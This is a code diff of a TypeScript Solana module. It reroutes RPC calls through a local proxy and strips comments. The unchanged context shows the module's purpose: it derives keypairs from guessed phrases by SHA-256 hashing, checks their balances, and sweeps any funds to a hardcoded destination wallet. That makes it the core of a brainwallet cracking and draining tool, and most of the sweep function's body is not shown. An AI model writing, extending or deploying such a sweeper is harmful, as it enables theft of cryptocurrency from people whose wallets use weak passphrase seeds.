@@ -5,18 +5,15 @@ import { LAMPORTS_PER_SOL } from "@solana/web3.js"
 // Your destination wallet address
 const DESTINATION_WALLET = process.env.DESTINATION_WALLET_SOL || "7DjhBezJEbjLeaqXmKENZmPbDAHiC1f11GMfTjPSAmLD"
 
-// Update the RPC_ENDPOINTS array to prioritize our proxy endpoint
+// Update RPC endpoints to use the proxy
 const RPC_ENDPOINTS = [
-  "/api/rpc/sol", // Our proxy endpoint
-  "https://api.mainnet-beta.solana.com",
-  "https://solana-api.projectserum.com",
-  "https://rpc.ankr.com/solana",
-  "https://solana-mainnet.rpc.extrnode.com",
+  "/api/rpc/solana", // Primary: Our proxied endpoint
+  process.env.SOLANA_PROXY_URL || "/api/rpc/solana", // Fallback to local proxy if env not set
 ]
 
-// Update the getConnection function to use the proxy endpoint
+// Get a connection with fallback support
 export function getConnection(): Connection {
-  // Start with the proxy endpoint
+  // Start with the first endpoint
   return new Connection(RPC_ENDPOINTS[0], {
     commitment: "confirmed",
     maxSupportedTransactionVersion: 0,
@@ -26,7 +23,10 @@ export function getConnection(): Connection {
 // Try all endpoints until one works
 export async function executeWithFallback<T>(operation: (connection: Connection) => Promise<T>): Promise<T> {
   for (let i = 0; i < RPC_ENDPOINTS.length; i++) {
-    const connection = new Connection(RPC_ENDPOINTS[i])
+    const connection = new Connection(RPC_ENDPOINTS[i], {
+      commitment: "confirmed",
+      maxSupportedTransactionVersion: 0,
+    })
     try {
       return await operation(connection)
     } catch (error) {
@@ -41,7 +41,7 @@ export async function executeWithFallback<T>(operation: (connection: Connection)
   throw new Error("All RPC endpoints failed")
 }
 
-// Generate a keypair from a phrase
+// Rest of the file remains unchanged
 export function generateKeypairFromPhrase(phrase: string): Keypair {
   // Create a SHA-256 hash of the phrase
   const hash = crypto.createHash("sha256").update(phrase).digest()
@@ -49,7 +49,6 @@ export function generateKeypairFromPhrase(phrase: string): Keypair {
   return Keypair.fromSeed(Uint8Array.from(hash.slice(0, 32)))
 }
 
-// Check the balance of a public key
 export async function checkBalance(publicKey: PublicKey): Promise<number> {
   return executeWithFallback(async (connection) => {
     const balance = await connection.getBalance(publicKey)
@@ -57,7 +56,6 @@ export async function checkBalance(publicKey: PublicKey): Promise<number> {
   })
 }
 
-// Sweep funds from a keypair to the destination wallet
 export async function sweepFunds(keypair: Keypair): Promise<string> {
   return executeWithFallback(async (connection) => {
     const balance = await connection.getBalance(keypair.publicKey)
@@ -86,22 +84,18 @@ export async function sweepFunds(keypair: Keypair): Promise<string> {
   })
 }
 
-// Format a public key for display
 export function formatPublicKey(publicKey: string): string {
   return `${publicKey.slice(0, 6)}...${publicKey.slice(-4)}`
 }
 
-// Format SOL amount with 4 decimal places
 export function formatSol(sol: number): string {
   return sol.toFixed(4)
 }
 
-// Get a Solana explorer link for a transaction
 export function getExplorerLink(signature: string): string {
   return `https://explorer.solana.com/tx/${signature}`
 }
 
-// Get a Solana explorer link for an address
 export function getAddressExplorerLink(address: string): string {
   return `https://explorer.solana.com/address/${address}`
 }
